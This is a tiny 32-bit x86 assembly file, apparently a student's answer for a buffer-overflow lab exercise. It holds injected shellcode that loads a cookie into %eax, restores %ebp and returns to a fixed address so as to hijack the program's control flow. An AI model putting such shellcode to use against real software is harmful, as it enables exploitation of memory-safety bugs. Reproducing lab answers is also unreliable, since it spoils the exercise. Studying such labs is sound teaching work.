# gcc boom.s -c -o boom.o -nostdlib -m32
.text
    movl $0x7b52e696, %eax # %eax = my cookie
    movl $0x55683c80, %ebp # 恢复ebp的值
    push $0x08048e81
    ret

